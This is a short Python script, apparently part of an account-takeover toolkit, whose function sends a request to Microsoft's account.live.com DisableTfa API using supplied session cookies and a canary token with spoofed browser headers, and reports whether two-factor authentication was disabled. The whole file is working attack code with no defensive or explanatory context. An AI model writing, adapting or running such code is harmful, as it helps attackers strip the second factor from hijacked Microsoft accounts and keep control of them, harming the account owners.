import httpx

async def remove2FA(amrp: str, apicanary: str, amsc: str):

    async with httpx.AsyncClient(timeout=None) as session:

        remove = await session.post(
            "https://account.live.com/API/Proofs/DisableTfa",
            headers = {
                "host": "account.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-ms-apiVersion": "2",
                "x-ms-apiTransport": "xhr",
                "uiflvr": "1001",
                "scid": "100109",
                "hpgid": "201030",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://account.live.com",
                "Connection": "keep-alive",
                "Referer": "https://account.live.com/proofs/Manage/additional",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",               
                "Cookie": f"AMRPSSecAuth={amrp}; amsc={amsc}",
                "canary": apicanary
            },
            json = {
                "uiflvr": 1001,
                "uaid": "abd2ca2a346c43c198c9ca7e4255f3bc",
                "scid": 100109,
                "hpgid": 201030
            },
            follow_redirects = False
        )

        if "apiCanary" in remove.json() and remove.status_code == 200:
            print("[+] - Disabled 2FA")
        else:
            print("[X] - Failed to disable 2FA")
